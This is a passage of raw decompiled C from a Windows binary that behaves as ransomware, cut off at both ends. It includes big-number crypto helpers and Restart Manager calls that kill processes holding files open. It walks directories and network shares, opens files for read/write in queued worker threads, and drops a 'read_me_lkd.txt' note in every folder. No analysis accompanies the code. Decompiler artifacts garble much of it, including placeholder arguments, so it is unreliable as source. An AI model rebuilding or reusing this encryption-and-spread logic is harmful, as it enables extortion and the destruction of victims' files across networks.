        if (v9 >= 0 != v9 != 0) {
            // 0x40442d
            return result;
        }
        v8 -= 4;
    }
    // 0x40442d
    return result ^ 1;
}

// Address range: 0x404440 - 0x404542
int32_t function_404440(void) {
    // 0x404440
    int32_t v1; // 0x404440
    int32_t * v2 = (int32_t *)(v1 + 4); // 0x40444d
    int32_t v3 = *v2; // 0x40444d
    int32_t v4 = v3 < 0 ? -v3 : v3; // 0x404458
    int32_t * v5 = (int32_t *)(v1 + 8); // 0x40445a
    uint32_t v6; // 0x404440
    int32_t v7 = v6 / 32; // 0x404465
    int32_t v8 = 1 << (v6 & 31);
    int32_t v9; // 0x404440
    int32_t result; // 0x404536
    if (v7 >= v4) {
        int32_t v10 = v7 + 1; // 0x404479
        int32_t v11 = v10 > 1 ? v10 : 1; // 0x404488
        int32_t * v12 = HeapReAlloc(GetProcessHeap(), (int32_t)&g266, &g266, (int32_t)&g266); // 0x40449c
        int32_t v13 = (int32_t)v12; // 0x40449c
        *v5 = v13;
        int32_t v14 = *v2; // 0x4044ab
        *(int32_t *)v1 = v11;
        if ((v14 < 0 ? -v14 : v14) > v11) {
            // 0x4044b9
            *v2 = 0;
        }
        // 0x4044c9
        *(int32_t *)(4 * v7 + v13) = v8;
        if (v4 < v7) {
            // 0x4044d0
            __asm_rep_stosd_memset((char *)(4 * v4 + v13), 0, v7 - v4);
        }
        // 0x40452d
        v9 = v10;
        result = *v2 >= 0 ? v9 : -v9;
        *v2 = result;
        return result;
    }
    int32_t v15 = *v5 + 4 * v7; // 0x4044ef
    int32_t v16 = 0; // 0x4044ef
    uint32_t v17 = v8;
    int32_t * v18 = (int32_t *)v15; // 0x4044f0
    uint32_t v19 = *v18 + v17; // 0x4044f5
    *v18 = v19;
    v16++;
    int32_t v20 = v19 < v17;
    v15 += 4;
    while (v16 < v4 - v7) {
        // 0x4044f0
        v17 = v20;
        v18 = (int32_t *)v15;
        v19 = *v18 + v17;
        *v18 = v19;
        v16++;
        v20 = v19 < v17;
        v15 += 4;
    }
    // 0x404508
    if (v19 >= v17) {
        // 0x40452d
        v9 = v4;
        result = *v2 >= 0 ? v9 : -v9;
        *v2 = result;
        return result;
    }
    int32_t v21; // 0x404440
    if (v4 == 0x7fffffff) {
        // 0x404527
        v21 = *v5;
    } else {
        // 0x404519
        v21 = function_402c80();
    }
    // 0x40452a
    *(int32_t *)(v21 + 4 * v4) = v20;
    // 0x40452d
    v9 = v4 + 1;
    result = *v2 >= 0 ? v9 : -v9;
    *v2 = result;
    return result;
}

// Address range: 0x404550 - 0x404621
int32_t function_404550(int32_t a1) {
    // 0x404550
    uint32_t v1; // 0x404550
    int32_t * v2 = (int32_t *)(v1 + 8); // 0x404571
    int32_t v3 = *v2; // 0x404577
    if (v1 <= 63) {
        int32_t * v4 = HeapReAlloc(GetProcessHeap(), (int32_t)&g266, &g266, (int32_t)&g266); // 0x404588
        int32_t v5 = (int32_t)v4; // 0x404588
        *(int32_t *)v1 = 64;
        int32_t * v6 = (int32_t *)(v1 + 4); // 0x404596
        int32_t v7 = *v6; // 0x404596
        *v2 = v5;
        v3 = v5;
        if ((v7 < 0 ? -v7 : v7) >= 65) {
            // 0x4045a9
            *v6 = 0;
            v3 = v5;
        }
    }
    int32_t v8 = 256; // 0x4045b6
    int32_t v9 = a1 + 255; // 0x4045b6
    int32_t v10 = 0;
    int32_t v11 = 0;
    int32_t v12 = (int32_t)*(char *)v9 << (8 * v10 & 24); // 0x4045d0
    int32_t v13 = v11; // 0x4045d5
    int32_t v14 = v12; // 0x4045d5
    int32_t v15 = v10 + 1; // 0x4045d5
    if (v10 == 3) {
        // 0x4045d7
        *(int32_t *)(4 * v11 + v3) = v12;
        v13 = v11 + 1;
        v14 = 0;
        v15 = 0;
    }
    int32_t v16 = v14;
    int32_t result2 = v13;
    v8--;
    v9--;
    while (v8 != 0) {
        // 0x4045c0
        v10 = v15;
        v11 = result2;
        v12 = (int32_t)*(char *)v9 << (8 * v10 & 24) | v16;
        v13 = v11;
        v14 = v12;
        v15 = v10 + 1;
        if (v10 == 3) {
            // 0x4045d7
            *(int32_t *)(4 * v11 + v3) = v12;
            v13 = v11 + 1;
            v14 = 0;
            v15 = 0;
        }
        // 0x4045df
        v16 = v14;
        result2 = v13;
        v8--;
        v9--;
    }
    if (v16 != 0) {
        // 0x4045ec
        *(int32_t *)(4 * result2 + v3) = v16;
        int32_t result = result2 + 1; // 0x4045ef
        *(int32_t *)(v1 + 4) = result;
        return result;
    }
    // 0x4045fd
    if (result2 < 1) {
        // 0x404614
        *(int32_t *)(v1 + 4) = result2;
        return result2;
    }
    int32_t v17 = result2; // 0x404604
    int32_t v18 = 4 * result2 + v3; // 0x404604
    v18 -= 4;
    int32_t result3 = v17; // 0x40460a
    while (*(int32_t *)v18 == 0) {
        // 0x40460c
        v17--;
        result3 = v17;
        if (v17 >= 0 != v17 != 0) {
            // break -> 0x404614
            break;
        }
        v18 -= 4;
        result3 = v17;
    }
    // 0x404614
    *(int32_t *)(v1 + 4) = result3;
    return result3;
}

// Address range: 0x404630 - 0x4046dd
int32_t function_404630(int32_t a1) {
    int32_t v1 = *(int32_t *)(a1 + 4); // 0x40463f
    if (v1 == 0) {
        // 0x4046c3
        int32_t result; // 0x404630
        return result;
    }
    int32_t * v2 = (int32_t *)(a1 + 8); // 0x40464e
    int32_t v3 = v1 < 0 ? -v1 : v1; // 0x404651
    int32_t v4 = 4 * v3 - 4;
    uint32_t v5 = *(int32_t *)(*v2 + v4);
    int32_t v6 = 0;
    int32_t v7 = v5 / 256; // 0x404660
    int32_t v8 = v6 + 1; // 0x404663
    while (v5 >= 256) {
        // 0x404660
        v5 = v7;
        v6 = v8;
        v7 = v5 / 256;
        v8 = v6 + 1;
    }
    int32_t result2; // 0x404630
    int32_t v9; // 0x404630
    if (v9 == 0) {
        int32_t * v10 = HeapAlloc(GetProcessHeap(), (int32_t)&g266, (int32_t)&g266); // 0x40467f
        result2 = (int32_t)v10;
    }
    int32_t v11 = v8 + v4; // 0x40466e
    if (v11 == 0) {
        // 0x4046c3
        return result2;
    }
    int32_t v12 = 0; // 0x40469a
    int32_t v13 = v6 + v4 + result2; // 0x40469a
    int32_t v14 = v11; // 0x40469a
    int32_t v15 = 0;
    int32_t v16 = v15; // 0x4046a2
    int32_t v17 = v12; // 0x4046a2
    int32_t v18 = v7; // 0x4046a2
    if (v12 == 0) {
        // 0x4046a4
        v16 = v15;
        v17 = 4;
        v18 = v7;
        if (v15 < v3) {
            // 0x4046a8
            v16 = v15 + 1;
            v17 = 4;
            v18 = *(int32_t *)(*v2 + 4 * v15);
        }
    }
    // 0x4046b7
    *(char *)v13 = (char)v18;
    v14--;
    v12 = v17 - 1;
    v13--;
    while (v14 != 0) {
        int32_t v19 = v18 / 256;
        v15 = v16;
        v16 = v15;
        v17 = v12;
        v18 = v19;
        if (v12 == 0) {
            // 0x4046a4
            v16 = v15;
            v17 = 4;
            v18 = v19;
            if (v15 < v3) {
                // 0x4046a8
                v16 = v15 + 1;
                v17 = 4;
                v18 = *(int32_t *)(*v2 + 4 * v15);
            }
        }
        // 0x4046b7
        *(char *)v13 = (char)v18;
        v14--;
        v12 = v17 - 1;
        v13--;
    }
    // 0x4046c3
    return result2;
}

// Address range: 0x4046e0 - 0x40496c
int32_t function_4046e0(void) {
    int32_t v1 = __readfsdword(44); // 0x4046e6
    int32_t v2; // bp-100, 0x4046e0
    int32_t v3 = &v2; // 0x4046ed
    int32_t v4 = (int32_t)g243; // 0x4046f5
    int32_t * v5 = (int32_t *)(*(int32_t *)v1 + 4); // 0x4046fa
    int32_t v6 = v3; // 0x404700
    int32_t v7 = v4; // 0x404700
    if (*v5 < v4) {
        int16_t * v8 = (int16_t *)&g243; // bp-104, 0x404702
        int32_t v9 = function_406272((int32_t *)&g243); // 0x404707
        v6 = v3;
        v7 = v9;
        if (g243 == (int16_t *)-1) {
            // 0x404718
            v8 = L"Rstrtmgr.dll";
            g249 = (int32_t)LoadLibraryW(L"Rstrtmgr.dll");
            int32_t v10 = function_406228((int32_t *)&g243); // 0x40472d
            v6 = (int32_t)&v8;
            v7 = v10;
        }
    }
    // 0x404735
    if (g249 == 0) {
        // 0x404964
        return v7 & -256;
    }
    int32_t v11 = v6 - 4; // 0x404747
    int32_t v12 = v11; // 0x404754
    if (g253 > *v5) {
        int32_t * v13 = (int32_t *)(v6 - 8); // 0x404756
        *v13 = (int32_t)&g253;
        function_406272(&g266);
        v12 = v11;
        if (g253 == -1) {
            // 0x40476c
            *v13 = (int32_t)"RmStartSession";
            int32_t v14 = v6 - 12; // 0x404771
            *(int32_t *)v14 = g249;
            int32_t (*func)() = GetProcAddress(&g266, (char *)&g266); // 0x404777
            *(int32_t *)(v6 - 16) = (int32_t)&g253;
            g247 = (int32_t)func;
            function_406228(&g266);
            v12 = v14;
        }
    }
    int32_t v15 = v12; // 0x404796
    if (g242 > *v5) {
        int32_t * v16 = (int32_t *)(v12 - 4); // 0x404798
        *v16 = (int32_t)&g242;
        function_406272(&g266);
        v15 = v12;
        if (g242 == -1) {
            // 0x4047ae
            *v16 = (int32_t)"RmRegisterResources";
            int32_t v17 = v12 - 8; // 0x4047b3
            *(int32_t *)v17 = g249;
            int32_t (*func2)() = GetProcAddress(&g266, (char *)&g266); // 0x4047b9
            *(int32_t *)(v12 - 12) = (int32_t)&g242;
            g252 = (int32_t)func2;
            function_406228(&g266);
            v15 = v17;
        }
    }
    int32_t v18 = v15; // 0x4047d8
    if (g248 > *v5) {
        int32_t * v19 = (int32_t *)(v15 - 4); // 0x4047da
        *v19 = (int32_t)&g248;
        function_406272(&g266);
        v18 = v15;
        if (g248 == -1) {
            // 0x4047f0
            *v19 = (int32_t)"RmGetList";
            int32_t v20 = v15 - 8; // 0x4047f5
            *(int32_t *)v20 = g249;
            int32_t (*func3)() = GetProcAddress(&g266, (char *)&g266); // 0x4047fb
            *(int32_t *)(v15 - 12) = (int32_t)&g248;
            g245 = (int32_t)func3;
            function_406228(&g266);
            v18 = v20;
        }
    }
    int32_t v21 = v18; // 0x40481a
    if (g246 > *v5) {
        int32_t * v22 = (int32_t *)(v18 - 4); // 0x40481c
        *v22 = (int32_t)&g246;
        function_406272(&g266);
        v21 = v18;
        if (g246 == -1) {
            // 0x404832
            *v22 = (int32_t)"RmEndSession";
            int32_t v23 = v18 - 8; // 0x404837
            *(int32_t *)v23 = g249;
            int32_t (*func4)() = GetProcAddress(&g266, (char *)&g266); // 0x40483d
            *(int32_t *)(v18 - 12) = (int32_t)&g246;
            g251 = (int32_t)func4;
            function_406228(&g266);
            v21 = v23;
        }
    }
    int32_t v24 = v21; // 0x40485c
    int32_t v25 = g244; // 0x40485c
    if (g244 > *v5) {
        int32_t * v26 = (int32_t *)(v21 - 4); // 0x40485e
        *v26 = (int32_t)&g244;
        int32_t v27 = function_406272(&g266); // 0x404863
        v24 = v21;
        v25 = v27;
        if (g244 == -1) {
            // 0x404874
            *v26 = (int32_t)"RmShutdown";
            int32_t v28 = v21 - 8; // 0x404879
            *(int32_t *)v28 = g249;
            int32_t (*func5)() = GetProcAddress(&g266, (char *)&g266); // 0x40487f
            *(int32_t *)(v21 - 12) = (int32_t)&g244;
            g250 = (int32_t)func5;
            int32_t v29 = function_406228(&g266); // 0x40488b
            v24 = v28;
            v25 = v29;
        }
    }
    // 0x404893
    if (g247 == 0 | g252 == 0 | g245 == 0 || g251 == 0 || g250 == 0) {
        // 0x404964
        return v25 & -256;
    }
    int32_t * v30 = (int32_t *)v24; // 0x4048d6
    *v30 = 66;
    int32_t v31 = 0; // bp-8, 0x4048db
    int32_t * v32 = (int32_t *)(v24 - 4); // 0x4048e2
    *v32 = 0;
    int32_t * v33 = (int32_t *)(v24 - 8); // 0x4048e4
    int32_t v34; // bp-92, 0x4046e0
    int32_t v35 = &v34; // 0x4048e4
    *v33 = v35;
    function_407730(v31, (int32_t)&g266, (int32_t)&g266);
    *v30 = v35;
    *v32 = 0;
    int32_t v36 = &v31; // 0x4048f3
    *v33 = v36;
    return v36 & -256;
}

// Address range: 0x404970 - 0x404b52
int32_t function_404970(int32_t a1) {
    // 0x404970
    int32_t v1; // bp-616, 0x404970
    int32_t v2 = &v1; // 0x404984
    int32_t v3; // 0x404970
    int32_t v4; // 0x404970
    int32_t v5; // 0x404970
    int32_t v6; // 0x404a36
    int32_t v7; // 0x404998
    if (a1 != 0) {
        int32_t * hHeap = GetProcessHeap(); // 0x404991
        int32_t v8 = (int32_t)hHeap; // bp-628, 0x404997
        int32_t * lpFileName = HeapAlloc(hHeap, (int32_t)&g266, (int32_t)&g266); // 0x404998
        v2 = &v8;
        if (lpFileName != NULL) {
            // 0x4049a8
            v7 = (int32_t)lpFileName;
            wnsprintfW();
            int16_t * v9 = (int16_t *)lpFileName; // bp-636, 0x4049c4
            int32_t v10 = (int32_t)&v9; // 0x4049c4
            int32_t lpFindFileData; // bp-612, 0x404970
            int32_t * v11 = FindFirstFileW((int16_t *)lpFileName, (struct _WIN32_FIND_DATAW *)&lpFindFileData); // 0x4049c5
            v3 = v10;
            int32_t v12 = v10; // 0x4049d2
            if (v11 != (int32_t *)-1) {
                while (true) {
                  lab_0x4049d8:;
                    int32_t v13 = v3;
                    *(int32_t *)(v13 - 4) = v13 + 60;
                    *(int32_t *)(v13 - 8) = a1;
                    *(int32_t *)(v13 - 12) = (int32_t)L"%s\\%s";
                    *(int32_t *)(v13 - 16) = 0x7fff;
                    *(int32_t *)(v13 - 20) = v7;
                    wnsprintfW();
                    int32_t v14 = v13; // 0x4049f3
                    v4 = v13;
                    if ((*(char *)(v13 + 16) & 16) == 0) {
                        int32_t v15 = &g142;
                        int32_t v16 = v14;
                        *(int32_t *)(v16 - 4) = *(int32_t *)v15;
                        *(int32_t *)(v16 - 8) = v16 + 60;
                        int16_t * v17 = CharLowerW((int16_t *)&g266); // 0x404a07
                        int32_t v18 = v16 - 12; // 0x404a0d
                        *(int32_t *)v18 = (int32_t)v17;
                        int16_t * v19 = StrStrW((int16_t *)&g266, (int16_t *)&g266); // 0x404a0e
                        v4 = v18;
                        while (v19 == NULL) {
                            int32_t v20 = v15 + 4; // 0x404a1c
                            v14 = v18;
                            int32_t v21 = v20; // 0x404a25
                            if (v20 == (int32_t)&g143) {
                                int32_t v22 = v16 - 16; // 0x404a27
                                *(int32_t *)v22 = v7;
                                int32_t v23 = GetFileAttributesW((int16_t *)&g266); // 0x404a28
                                v6 = v22;
                                if ((v23 & 1) == 0) {
                                    goto lab_0x404a3d;
                                } else {
                                    // 0x404a32
                                    *(int32_t *)(v16 - 20) = v23 & -2;
                                    v6 = v16 - 24;
                                    *(int32_t *)v6 = v7;
                                    SetFileAttributesW((int16_t *)&g266, (int32_t)&g266);
                                    goto lab_0x404a3d;
                                }
                            }
                            v15 = v21;
                            v16 = v14;
                            *(int32_t *)(v16 - 4) = *(int32_t *)v15;
                            *(int32_t *)(v16 - 8) = v16 + 60;
                            v17 = CharLowerW((int16_t *)&g266);
                            v18 = v16 - 12;
                            *(int32_t *)v18 = (int32_t)v17;
                            v19 = StrStrW((int16_t *)&g266, (int16_t *)&g266);
                            v4 = v18;
                        }
                    }
                    goto lab_0x404ade;
                }
              lab_0x404af5:
                // 0x404af5
                v12 = v5 - 12;
                *(int32_t *)v12 = *(int32_t *)(v5 + 4);
                FindClose(&g266);
            }
            int32_t * v24 = (int32_t *)(v12 - 4); // 0x404aff
            *v24 = a1;
            int32_t * v25 = (int32_t *)(v12 - 8); // 0x404b00
            *v25 = (int32_t)L"%s\\read_me_lkd.txt";
            int32_t v26 = v12 - 12; // 0x404b05
            int32_t * v27 = (int32_t *)v26; // 0x404b05
            *v27 = 0x7fff;
            *(int32_t *)(v12 - 16) = v7;
            wnsprintfW();
            *v24 = v7;
            *v25 = 0;
            *v27 = (int32_t)GetProcessHeap();
            HeapFree(&g266, (int32_t)&g266, &g266);
            v2 = v26;
        }
    }
    // 0x404b32
    *(int32_t *)(v2 - 4) = 1;
    *(int32_t *)(v2 - 8) = (int32_t)&g240;
    InterlockedExchangeAdd(&g266, (int32_t)&g266);
    *(int32_t *)(v2 - 12) = a1;
    *(int32_t *)(v2 - 16) = 0;
    *(int32_t *)(v2 - 20) = (int32_t)GetProcessHeap();
    HeapFree(&g266, (int32_t)&g266, &g266);
    return 0;
  lab_0x404ade:
    // 0x404ade
    v5 = v4;
    *(int32_t *)(v5 - 4) = v5 + 16;
    int32_t v28 = v5 - 8; // 0x404ae3
    *(int32_t *)v28 = *(int32_t *)(v5 + 12);
    bool v29 = FindNextFileW(&g266, (struct _WIN32_FIND_DATAW *)&g266); // 0x404ae7
    v3 = v28;
    if (!v29) {
        // break -> 0x404af5
        goto lab_0x404af5;
    }
    goto lab_0x4049d8;
  lab_0x404a3d:;
    int32_t v30 = v6;
    *(int32_t *)(v30 - 4) = 0;
    *(int32_t *)(v30 - 8) = 0;
    *(int32_t *)(v30 - 12) = 3;
    *(int32_t *)(v30 - 16) = 0;
    *(int32_t *)(v30 - 20) = 1;
    *(int32_t *)(v30 - 24) = -0x40000000;
    int32_t v31 = v30 - 28; // 0x404a52
    *(int32_t *)v31 = v7;
    int32_t * v32 = CreateFileW((int16_t *)&g266, (int32_t)&g266, (int32_t)&g266, (struct _SECURITY_ATTRIBUTES *)&g266, (int32_t)&g266, (int32_t)&g266, &g266); // 0x404a53
    int32_t * v33 = v32; // 0x404a5a
    int32_t v34 = v31; // 0x404a5a
    if (v32 != (int32_t *)-1) {
        goto lab_0x404a8c;
    } else {
        goto lab_0x404a60;
    }
  lab_0x404a8c:
    // 0x404a8c
    *(int32_t *)(v34 - 4) = 1;
    *(int32_t *)(v34 - 8) = (int32_t)&g238;
    InterlockedExchangeAdd(&g266, (int32_t)&g266);
    int32_t * v35 = (int32_t *)(v34 - 12); // 0x404a99
    *v35 = 0x10004;
    int32_t v36 = function_40609b((int32_t)&g266); // 0x404a9e
    int32_t * v37 = (int32_t *)(v34 - 16); // 0x404aa3
    *v37 = 0x10004;
    int32_t * v38 = (int32_t *)(v34 - 20); // 0x404aaa
    *v38 = 0;
    int32_t * v39 = (int32_t *)(v34 - 24); // 0x404aac
    *v39 = v36;
    function_407730((int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
    *(int32_t *)v36 = (int32_t)v33;
    *v35 = 0x7fff;
    *v37 = v7;
    *v38 = v36 + 4;
    lstrcpynW((int16_t *)&g266, (int16_t *)&g266, (int32_t)&g266);
    *v39 = 0;
    *(int32_t *)(v34 - 28) = v36;
    int32_t v40 = v34 - 32; // 0x404aca
    *(int32_t *)v40 = 0x4017b0;
    QueueUserWorkItem((int32_t (*)(int32_t *))&g266, &g266, (int32_t)&g266);
    v4 = v40;
    goto lab_0x404ade;
  lab_0x404a60:
    // 0x404a60
    if ((char)function_4046e0() == 1) {
        goto lab_0x404a60;
    } else {
        // 0x404a6b
        *(int32_t *)(v30 - 32) = 0;
        *(int32_t *)(v30 - 36) = 0;
        *(int32_t *)(v30 - 40) = 3;
        *(int32_t *)(v30 - 44) = 0;
        *(int32_t *)(v30 - 48) = 1;
        *(int32_t *)(v30 - 52) = -0x40000000;
        int32_t v41 = v30 - 56; // 0x404a7a
        *(int32_t *)v41 = v7;
        int32_t * v42 = CreateFileW((int16_t *)&g266, (int32_t)&g266, (int32_t)&g266, (struct _SECURITY_ATTRIBUTES *)&g266, (int32_t)&g266, (int32_t)&g266, &g266); // 0x404a7b
        v33 = v42;
        v34 = v41;
        if (v42 != (int32_t *)-1) {
            goto lab_0x404a8c;
        } else {
            // 0x404a84
            GetLastError();
            v4 = v41;
            goto lab_0x404ade;
        }
    }
}

// Address range: 0x404b60 - 0x404d25
int32_t function_404b60(int32_t lpString2) {
    int32_t v1 = lpString2;
    if (lpString2 == 0) {
        // 0x404d1c
        int32_t result; // 0x404b60
        return result;
    }
    int32_t * lpString1 = HeapAlloc(GetProcessHeap(), (int32_t)&g266, (int32_t)&g266); // 0x404b8b
    lstrcpyW((int16_t *)lpString1, (int16_t *)lpString2);
    InterlockedExchangeAdd(&g241, 1);
    QueueUserWorkItem((int32_t (*)(int32_t *))0x404970, lpString1, 0);
    int32_t * lpFileName = HeapAlloc(GetProcessHeap(), (int32_t)&g266, (int32_t)&g266); // 0x404bc0
    int32_t result2 = (int32_t)lpFileName; // 0x404bc0
    if (lpFileName == NULL) {
        // 0x404d1c
        return result2;
    }
    // 0x404bcc
    wnsprintfW();
    int16_t * v2 = (int16_t *)lpFileName; // bp-676, 0x404be8
    int32_t v3 = (int32_t)&v2; // 0x404be8
    char lpFindFileData; // bp-600, 0x404b60
    int32_t * v4 = FindFirstFileW((int16_t *)lpFileName, (struct _WIN32_FIND_DATAW *)&lpFindFileData); // 0x404be9
    v1 = (int32_t)v4;
    int32_t v5 = v3; // 0x404bf5
    int32_t v6; // 0x404b60
    int32_t v7; // 0x404b60
    int32_t v8; // 0x404b60
    if (v4 != (int32_t *)-1) {
        // 0x404c01
        int32_t v9; // bp-556, 0x404b60
        int32_t v10 = &v9; // 0x404c07
        v6 = v3;
        while (true) {
          lab_0x404c01:;
            int32_t * v11 = (int32_t *)(v6 - 4); // 0x404c07
            *v11 = v10;
            int32_t v12 = v6 - 8; // 0x404c08
            int32_t * v13 = (int32_t *)v12; // 0x404c08
            *v13 = lpString2;
            int32_t * v14 = (int32_t *)(v6 - 12); // 0x404c09
            *v14 = (int32_t)L"%s\\%s";
            int32_t v15 = v6 - 16; // 0x404c0e
            int32_t * v16 = (int32_t *)v15; // 0x404c0e
            *v16 = 0x7fff;
            *(int32_t *)(v6 - 20) = result2;
            wnsprintfW();
            v7 = v6;
            if ((lpFindFileData & 16) != 0) {
                // 0x404c26
                *v11 = (int32_t)L"..";
                *v13 = v10;
                int32_t v17 = lstrcmpW((int16_t *)&g266, (int16_t *)&g266); // 0x404c32
                v7 = v12;
                if (v17 != 0) {
                    // 0x404c38
                    *v14 = (int32_t)&g75;
                    *v16 = v10;
                    int32_t v18 = lstrcmpW((int16_t *)&g266, (int16_t *)&g266); // 0x404c44
                    int32_t v19 = v15; // 0x404c48
                    v7 = v15;
                    if (v18 != 0) {
                        int32_t v20 = &g143;
                        int32_t v21 = v19;
                        *(int32_t *)(v21 - 4) = *(int32_t *)v20;
                        *(int32_t *)(v21 - 8) = v10;
                        int16_t * v22 = CharLowerW((int16_t *)&g266); // 0x404c59
                        int32_t v23 = v21 - 12; // 0x404c5f
                        *(int32_t *)v23 = (int32_t)v22;
                        int16_t * v24 = StrStrW((int16_t *)&g266, (int16_t *)&g266); // 0x404c60
                        v7 = v23;
                        while (v24 == NULL) {
                            int32_t v25 = v20 + 4; // 0x404c6a
                            v19 = v23;
                            int32_t v26 = v25; // 0x404c73
                            if (v25 == (int32_t)&g144) {
                                int32_t v27 = v21 - 16; // 0x404c75
                                *(int32_t *)v27 = result2;
                                function_404b60((int32_t)&g266);
                                v7 = v27;
                                goto lab_0x404c86;
                            }
                            v20 = v26;
                            v21 = v19;
                            *(int32_t *)(v21 - 4) = *(int32_t *)v20;
                            *(int32_t *)(v21 - 8) = v10;
                            v22 = CharLowerW((int16_t *)&g266);
                            v23 = v21 - 12;
                            *(int32_t *)v23 = (int32_t)v22;
                            v24 = StrStrW((int16_t *)&g266, (int16_t *)&g266);
                            v7 = v23;
                        }
                    }
                }
            }
            goto lab_0x404c86;
        }
      lab_0x404c9e:
        // 0x404c9e
        v5 = v8 - 12;
        *(int32_t *)v5 = v1;
        FindClose(&g266);
    }
    int32_t * v28 = (int32_t *)(v5 - 4); // 0x404ca7
    *v28 = lpString2;
    int32_t * v29 = (int32_t *)(v5 - 8); // 0x404ca8
    *v29 = (int32_t)L"%s\\read_me_lkd.txt";
    int32_t * v30 = (int32_t *)(v5 - 12); // 0x404cad
    *v30 = 0x7fff;
    int32_t * v31 = (int32_t *)(v5 - 16); // 0x404cb2
    *v31 = result2;
    wnsprintfW();
    *v28 = 0;
    *v29 = 128;
    *v30 = 1;
    *v31 = 0;
    *(int32_t *)(v5 - 20) = 0;
    *(int32_t *)(v5 - 24) = 0x40000000;
    int32_t v32 = v5 - 28; // 0x404cce
    *(int32_t *)v32 = result2;
    int32_t * v33 = CreateFileW((int16_t *)&g266, (int32_t)&g266, (int32_t)&g266, (struct _SECURITY_ATTRIBUTES *)&g266, (int32_t)&g266, (int32_t)&g266, &g266); // 0x404ccf
    int32_t v34 = v32; // 0x404cda
    if (v33 != (int32_t *)-1) {
        int32_t v35 = (int32_t)v33; // 0x404ccf
        *(int32_t *)(v5 - 32) = 0;
        *(int32_t *)(v5 - 36) = (int32_t)&v1;
        int32_t v36 = g147 >= 8 ? (int32_t)g145 : (int32_t)&g145; // 0x404cf3
        *(int32_t *)(v5 - 40) = 2 * (int32_t)g146;
        *(int32_t *)(v5 - 44) = v36;
        *(int32_t *)(v5 - 48) = v35;
        WriteFile(&g266, &g266, (int32_t)&g266, &g266, (struct _OVERLAPPED *)&g266);
        v34 = v5 - 52;
        *(int32_t *)v34 = v35;
        CloseHandle(&g266);
    }
    // 0x404d0c
    *(int32_t *)(v34 - 4) = result2;
    *(int32_t *)(v34 - 8) = 0;
    *(int32_t *)(v34 - 12) = (int32_t)GetProcessHeap();
    // 0x404d1c
    return HeapFree(&g266, (int32_t)&g266, &g266);
  lab_0x404c86:
    // 0x404c86
    v8 = v7;
    *(int32_t *)(v8 - 4) = (int32_t)&lpFindFileData;
    int32_t v37 = v8 - 8; // 0x404c8d
    *(int32_t *)v37 = v1;
    bool v38 = FindNextFileW(&g266, (struct _WIN32_FIND_DATAW *)&g266); // 0x404c90
    v6 = v37;
    if (!v38) {
        // break -> 0x404c9e
        goto lab_0x404c9e;
    }
    goto lab_0x404c01;
}

// Address range: 0x404d30 - 0x404dfe
int32_t function_404d30(int32_t lpNetResource) {
    int32_t lpcCount = -1; // bp-8, 0x404d3c
    int32_t lpBufferSize = 0x4000; // bp-12, 0x404d47
    int32_t lphEnum; // bp-16, 0x404d30
    int32_t result = WNetOpenEnumW(2, 0, 19, (struct _NETRESOURCEW *)lpNetResource, (int32_t **)&lphEnum); // 0x404d54
    if (result != 0) {
        // 0x404df5
        return result;
    }
    int32_t * hHeap = GetProcessHeap(); // 0x404d67
    int32_t v1 = (int32_t)hHeap; // bp-64, 0x404d6d
    int32_t * lpBuffer = HeapAlloc(hHeap, (int32_t)&g266, (int32_t)&g266); // 0x404d6e
    int32_t v2 = &v1; // 0x404d78
    if (lpBuffer != NULL) {
        int32_t v3 = (int32_t)lpBuffer; // 0x404d6e
        int32_t v4 = lphEnum; // bp-80, 0x404d83
        int32_t v5 = &v4; // 0x404d83
        int32_t v6 = WNetEnumResourceW((int32_t *)lphEnum, &lpcCount, lpBuffer, &lpBufferSize); // 0x404d86
        int32_t v7 = v5; // 0x404d8e
        if (v6 == 0) {
            int32_t v8 = v5; // 0x404d95
            int32_t v9; // 0x404d30
            int32_t v10; // 0x404d30
            int32_t v11; // 0x404d30
            int32_t v12; // 0x404d30
            int32_t v13; // 0x404d30
            int32_t v14; // 0x404db6
            int32_t v15; // 0x404dae
            int32_t v16; // 0x404dbd
            if (lpcCount != 0) {
                v11 = v3 + 20;
                if ((*(char *)(v11 - 8) & 2) == 0) {
                    // 0x404db6
                    v14 = v5 - 4;
                    *(int32_t *)v14 = *(int32_t *)v11;
                    function_404b60((int32_t)&g266);
                    v13 = v14;
                } else {
                    // 0x404da6
                    v15 = v5 - 4;
                    *(int32_t *)v15 = v11 - 20;
                    function_404d30((int32_t)&g266);
                    v13 = v15;
                }
                // 0x404dbd
                v16 = 1;
                v10 = v11 + 32;
                v9 = v16;
                v8 = v13;
                while (v16 < lpcCount) {
                    // 0x404da0
                    v11 = v10;
                    v12 = v13;
                    if ((*(char *)(v11 - 8) & 2) == 0) {
                        // 0x404db6
                        v14 = v12 - 4;
                        *(int32_t *)v14 = *(int32_t *)v11;
                        function_404b60((int32_t)&g266);
                        v13 = v14;
                    } else {
                        // 0x404da6
                        v15 = v12 - 4;
                        *(int32_t *)v15 = v11 - 20;
                        function_404d30((int32_t)&g266);
                        v13 = v15;
                    }
                    // 0x404dbd
                    v16 = v9 + 1;
                    v10 = v11 + 32;
                    v9 = v16;
                    v8 = v13;
                }
            }
            // 0x404dc6
            *(int32_t *)(v8 - 4) = (int32_t)&lpBufferSize;
            *(int32_t *)(v8 - 8) = v3;
            *(int32_t *)(v8 - 12) = (int32_t)&lpcCount;
            int32_t v17 = v8 - 16; // 0x404dcf
            *(int32_t *)v17 = lphEnum;
            int32_t v18 = WNetEnumResourceW(&g266, &g266, &g266, &g266); // 0x404dd2
            v7 = v17;
            while (v18 == 0) {
                int32_t v19 = v17; // 0x404d95
                v8 = v17;
                if (lpcCount != 0) {
                    v11 = v3 + 20;
                    v12 = v19;
                    if ((*(char *)(v11 - 8) & 2) == 0) {
                        // 0x404db6
                        v14 = v12 - 4;
                        *(int32_t *)v14 = *(int32_t *)v11;
                        function_404b60((int32_t)&g266);
                        v13 = v14;
                    } else {
                        // 0x404da6
                        v15 = v12 - 4;
                        *(int32_t *)v15 = v11 - 20;
                        function_404d30((int32_t)&g266);
                        v13 = v15;
                    }
                    // 0x404dbd
                    v16 = 1;
                    v10 = v11 + 32;
                    v9 = v16;
                    v8 = v13;
                    while (v16 < lpcCount) {
                        // 0x404da0
                        v11 = v10;
                        v12 = v13;
                        if ((*(char *)(v11 - 8) & 2) == 0) {
                            // 0x404db6
                            v14 = v12 - 4;
                            *(int32_t *)v14 = *(int32_t *)v11;
                            function_404b60((int32_t)&g266);
                            v13 = v14;
                        } else {
                            // 0x404da6
                            v15 = v12 - 4;
                            *(int32_t *)v15 = v11 - 20;
                            function_404d30((int32_t)&g266);
                            v13 = v15;
                        }
